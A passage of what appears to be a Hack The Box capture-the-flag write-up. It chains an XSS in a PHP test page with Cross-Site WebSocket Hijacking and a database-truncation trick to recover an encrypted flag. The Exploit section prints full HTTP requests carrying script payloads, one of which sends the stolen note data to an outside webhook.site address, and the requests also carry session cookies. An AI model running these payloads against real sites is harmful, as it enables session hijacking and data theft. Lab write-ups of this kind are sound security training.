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" alt="htmltester"></p>
    <p class="has-line-data" data-line-start="286" data-line-end="287">The second app let’s you create notes in todo list. It also let’s you submit a url to the admin of the app for review in <code>report.js</code>. This is done using <code>puppeteer</code>. The admin logs in to the app and visits the submitted url. This is a candidate to perform <code>XSS</code> using the <code>php</code> app.</p>
    <p class="has-line-data" data-line-start="288" data-line-end="289">The problem is the <code>php</code> app runs on different port then the js app so performing classic HTTP requests in <code>XSS</code> to a different origin is blocked by <code>SOP</code> (Same-origin policy).</p>
    <p class="has-line-data" data-line-start="290" data-line-end="291">To get the flag, admin user has to log in to the app, create at least one note and then retrieve the note, ant there in <code>quote</code> will be the flag.</p>
    <p class="has-line-data" data-line-start="292" data-line-end="293">The approach is to call <code>/report</code> with <code>htmltester</code> url which contains an <code>XSS</code>. At this stage the admin is logged in and ready to visit our url. The url contains an <code>XSS</code> that performs the <code>Web Socket</code> call to add the note and then to retrieve the note.</p>
    <p class="has-line-data" data-line-start="294" data-line-end="295">We are able to do this because <code>SOP</code> doesn’t apply to websockets. This is called <code>Cross-Site WebSocket Hijacking (CSWSH)</code>. When we perform <code>XSS</code> to get added notes (with encrypted flag), we then exfiltrate the result on our listener.</p>
    <p class="has-line-data" data-line-start="296" data-line-end="297">Another problem is that the contents are in encrypted form and we do not know the secret key of the admin. We could potentially call <code>/secret</code> from the <code>XSS</code> to extract the secret but this is a standard HTTP call and therefore blocked by <code>SOP</code> since this call is cross-origin.</p>
    <p class="has-line-data" data-line-start="298" data-line-end="299">When we create a note, our title and description are formed into <code>json</code> string and then added to the db. There is no length checking and we can perhaps add more bytes to the item then expected.</p>
    <p class="has-line-data" data-line-start="300" data-line-end="301"><code>wsHandler.js</code></p>
    <pre><code class="has-line-data" data-line-start="302" data-line-end="304">await db.addTask(userId, `{&quot;title&quot;:&quot;${data.title}&quot;,&quot;description&quot;:&quot;${data.description}&quot;,&quot;secret&quot;:&quot;${secret}&quot;}`);
    </code></pre>
    <p class="has-line-data" data-line-start="305" data-line-end="306">The <code>data</code> entry in the table where our note is added has a max length of 255 chars.</p>
    <pre><code class="has-line-data" data-line-start="307" data-line-end="315">CREATE TABLE todos (
        id INT NOT NULL AUTO_INCREMENT,
        user_id INT NOT NULL,
        data VARCHAR(255) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY (user_id) REFERENCES users(id)
    );
    </code></pre>
    <p class="has-line-data" data-line-start="315" data-line-end="316">After the description the secret is added automatically to encrypt the entries, but if we input the description to be very long, we can push the secret beyong the accepted limit of the <code>VARCHAR</code> type.</p>
    <p class="has-line-data" data-line-start="317" data-line-end="318">Like this</p>
    <pre><code class="has-line-data" data-line-start="320" data-line-end="322">{&quot;title&quot;:&quot;My title&quot;,&quot;description&quot;:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    </code></pre>
    <p class="has-line-data" data-line-start="323" data-line-end="324">However, this is not a valid <code>json</code> and will cause an exception, and the secret is missing now. We have to manually add our own secret at the end. This secret will be used to encrypt the entry when we fetch the notes. Finally, we can use our injected secret to decrypt the items and retrieve the flag.</p>
    <p class="has-line-data" data-line-start="325" data-line-end="326">Like this</p>
    <pre><code class="has-line-data" data-line-start="328" data-line-end="330">{&quot;title&quot;:&quot;My title&quot;,&quot;description&quot;:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;,&quot;secret&quot;:&quot;41414141414141414141414141414141&quot;
    </code></pre>
    <h2 class="code-line" data-line-start="331" data-line-end="332"><a id="Exploit_331"></a>Exploit</h2>
    <p class="has-line-data" data-line-start="332" data-line-end="333">Inject a note, that contains our secret</p>
    <pre><code class="has-line-data" data-line-start="334" data-line-end="355">POST /report HTTP/1.1
    Host: 94.237.63.93:32890
    Content-Length: 586
    sec-ch-ua: &quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;
    sec-ch-ua-platform: &quot;Linux&quot;
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
    Content-Type: application/json
    Accept: */*
    Origin: http://94.237.63.93:32890
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://94.237.63.93:32890
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Cookie: jiveforums.admin.logviewer=logfile.size=23424139; JSESSIONID=node01rp4w74qdl6pk6xnm4hrwm48o7.node0; csrf=R31CsmZmbClSbWi; connect.sid=s%3AXrTQiFRL0eXUDfOR45JNb4etUpnKyUQB.zCbhNwQ%2Bj6W4CHQcWW5bc%2FCLWPSubbYGshChbcQl3F0
    Connection: close
    
    {&quot;url&quot;:&quot;http://127.0.0.1:8080/index.php?html=&lt;script&gt;const socket = new WebSocket('ws://127.0.0.1/ws');socket.onopen = function(event) {sendMessage()};socket.onmessage = function(event) {};socket.onclose = function(event) {};function sendMessage() {socket.send('{\&quot;action\&quot;:\&quot;add\&quot;,\&quot;title\&quot;:\&quot;admin\&quot;,\&quot;description\&quot;:\&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\\&quot;,\\\\\&quot;secret\\\\\&quot;:\\\\\&quot;41414141414141414141414141414141\\\\\&quot;}\&quot;}');}&lt;/script&gt;&quot;}
    </code></pre>
    <p class="has-line-data" data-line-start="356" data-line-end="357">Exfiltrate the note.</p>
    <pre><code class="has-line-data" data-line-start="359" data-line-end="380">POST /report HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 395
    sec-ch-ua: &quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;
    sec-ch-ua-platform: &quot;Linux&quot;
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
    Content-Type: application/json
    Accept: */*
    Origin: http://127.0.0.1
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Cookie: jiveforums.admin.logviewer=logfile.size=23424139; JSESSIONID=node01rp4w74qdl6pk6xnm4hrwm48o7.node0; csrf=R31CsmZmbClSbWi; connect.sid=s%3AXrTQiFRL0eXUDfOR45JNb4etUpnKyUQB.zCbhNwQ%2Bj6W4CHQcWW5bc%2FCLWPSubbYGshChbcQl3F0
    Connection: close
    
    {&quot;url&quot;:&quot;http://127.0.0.1:8080/index.php?html=&lt;script&gt;const socket = new WebSocket('ws://127.0.0.1/ws');socket.onopen = function(event) {sendMessage()};socket.onmessage = function(event) {fetch('http://webhook.site/0ca9321d-5cf7-415d-8f64-8a5eba61d106?'%2bevent.data, {mode: 'no-cors'})};socket.onclose = function(event) {};function sendMessage() {socket.send('{\&quot;action\&quot;:\&quot;get\&quot;}');}&lt;/script&gt;&quot;}
    </code></pre>
    <p class="has-line-data" data-line-start="381" data-line-end="382">The result can look like this.</p>
    <pre><code class="has-line-data" data-line-start="384" data-line-end="386" class="language-json">{"<span class="hljs-attribute">{\"title\":{\"iv\":\"865ddefced14da2134f40b8d10e4bb68\",\"content\":\"01bc271256\"},\"description\":{\"iv\":\"e19e14fe7e9c319251800561fe2af133\",\"content\":\"6effc8e9305c1bc3df304b3c19e12601b3062b08f6864115b0bb1dc7301fd40b82b7dcc44852531e81fd472b5b782e4edd13b209c1f57138db2805438a7fd51cab13b0dc55d912e8b9d577afb8884b864ac3864cfa4f010a08bbf51bbe1b95c7eb9e8cb76bb196101393c9de2d052e46ec2f9f11cd04a5eca5902c4a71a7fe452337613cd470e8c545f4619692f25a6621a22a79388b96fa129f945a5d8421ad5a92bd5bc61e4cb8c261bdd43abcd4dd2a\"},\"quote\":{\"iv\":\"18f325c0ee41352a4a74a79b70349b1d\",\"content\":\"e55dd2062b1ad7b0b545411aeffdd0da518aa3b7660c1b21896cbe2344b8626a187ae7aef4c830c09a1eeca820cb566dbe1023996b612b486eb90d16f82f80\"}}</span>":<span class="hljs-value"><span class="hljs-string">""</span></span>}
    </code></pre>
    <p class="has-line-data" data-line-start="387" data-line-end="388">Quote</p>
    <pre><code class="has-line-data" data-line-start="389" data-line-end="393">iv = 18f325c0ee41352a4a74a79b70349b1d
    content = e55dd2062b1ad7b0b545411aeffdd0da518aa3b7660c1b21896cbe2344b8626a187ae7aef4c830c09a1eeca820cb566dbe1023996b612b486eb90d16f82f80
    secret = 41414141414141414141414141414141
    </code></pre>
    <p class="has-line-data" data-line-start="394" data-line-end="395">No we can use the method <code>decrypt()</code> in <code>crypto.js</code> to decrypt the contents using our secret.</p>
    <pre><code class="has-line-data" data-line-start="397" data-line-end="406" class="language-javascript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
    <span class="hljs-keyword">const</span> algorithm = <span class="hljs-string">'aes-256-ctr'</span>;
    <span class="hljs-keyword">const</span> cipher = {<span class="hljs-string">"iv"</span>:<span class="hljs-string">"18f325c0ee41352a4a74a79b70349b1d"</span>,<span class="hljs-string">"content"</span>:<span class="hljs-string">"e55dd2062b1ad7b0b545411aeffdd0da518aa3b7660c1b21896cbe2344b8626a187ae7aef4c830c09a1eeca820cb566dbe1023996b612b486eb90d16f82f80"</span>};
    <span class="hljs-comment">//const key = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';</span>
    <span class="hljs-keyword">const</span> key = <span class="hljs-string">'41414141414141414141414141414141'</span>;
        <span class="hljs-keyword">const</span> decipher = crypto.createDecipheriv(algorithm, key, Buffer.from(cipher.iv, <span class="hljs-string">'hex'</span>));
        <span class="hljs-keyword">const</span> decrpyted = Buffer.concat([decipher.update(Buffer.from(cipher.content, <span class="hljs-string">'hex'</span>)), decipher.final()]);
        <span class="hljs-built_in">console</span>.log(decrpyted.toString());
    </code></pre>
    <h2 class="code-line" data-line-start="407" data-line-end="408"><a id="Loot_407"></a>Loot</h2>
    <pre><code class="has-line-data" data-line-start="409" data-line-end="412" class="language-bash">$ node decrypt.js 
    A wise man once said, <span class="hljs-string">"the flag is HTB{h1j4ck_4ll_th3_th1ngs}"</span>.
    </code></pre>
    <h2 class="code-line" data-line-start="413" data-line-end="414"><a id="Flag_413"></a>Flag</h2>
    <p class="has-line-data" data-line-start="414" data-line-end="415"><strong>HTB{h1j4ck_4ll_th3_th1ngs}</strong></p>

    <script src="/js/navbar.js"></script>
</body>

</html>